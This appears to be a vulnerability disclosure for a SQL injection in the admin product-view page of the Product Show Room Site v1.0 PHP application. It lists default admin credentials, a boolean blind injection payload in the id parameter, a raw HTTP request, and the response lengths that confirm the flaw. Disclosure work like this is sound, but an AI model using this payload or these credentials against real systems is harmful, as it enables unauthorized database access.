# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/?page=products/view_product&id=

Vulnerability location: /psrs/admin/?page=products/view_product&id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/?page=products/view_product&id=3%27%20and%20length(database())%20=7--+// Leak place ---> id

```sql
GET /psrs/admin/?page=products/view_product&id=3%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 31202
![image](https://user-images.githubusercontent.com/54017627/171828240-2fa67c8c-f37c-43a0-97ac-5450fafcc3dc.png)

![image](https://user-images.githubusercontent.com/54017627/171828320-76d7bc96-23b2-4589-a49c-a394acfa389f.png)

When length (database ()) = 7, Content-Length: 33019
![image](https://user-images.githubusercontent.com/54017627/171828201-70cf00a3-811f-40b2-93ab-41e61215e51c.png)

![image](https://user-images.githubusercontent.com/54017627/171828273-60648973-5071-44da-82a9-c590b3712426.png)
